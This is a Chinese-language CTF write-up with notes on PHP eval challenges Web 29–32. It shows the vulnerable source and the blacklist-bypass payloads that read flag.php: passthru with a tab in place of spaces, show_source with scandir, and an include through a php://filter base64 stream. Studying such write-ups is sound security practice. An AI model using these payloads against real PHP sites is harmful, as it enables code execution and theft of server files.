# Web 29
![[Pasted image 20240821155539.png]]
能执行`$_GET['c']`中的语句，但是这个语句中不能存在`flag`这个单词。
我们先看看有啥：
![[Pasted image 20240821155629.png]]
最终还是要让我们输出`flag.php`：
![[Pasted image 20240821160130.png]]
# Web 30
![[Pasted image 20240821161009.png]]
![[Pasted image 20240821161455.png]]
# Web 31
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:49:10  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```


用`/?c=passthru("tac%09fl*")`中的`%09`也就是`TAB`键代替空格`%20`
![[Pasted image 20240822091817.png]]
或者
`?c=show_source(scandir(getcwd())[2]);`
![[Pasted image 20240822092155.png]]
# Web 32
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2020-09-04 00:12:34  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-04 00:56:31  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

访问网站的时候用这个payload.
```
c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-
encode/resource=flag.php
```
- `include` 是 PHP 的一个函数，它会将指定文件的内容嵌入到当前脚本中执行。
- #### **恶意 `url` 参数**
```php
url=php://filter/read=convert.base64-encode/resource=flag.php
```
这部分代码的含义如下：
- `php://filter/`：PHP 提供的一种特殊的流，可以在访问文件时应用各种过滤器（filters）。`php://filter` 允许你对文件的内容进行操作（如编码、解码等）。
- `read=convert.base64-encode/`: 这是一种过滤器链，它会读取文件内容，并在读取时将内容转换为 Base64 编码。
- `resource=flag.php`：这是被读取和编码的实际文件，表示目标是服务器上的 `flag.php` 文件。
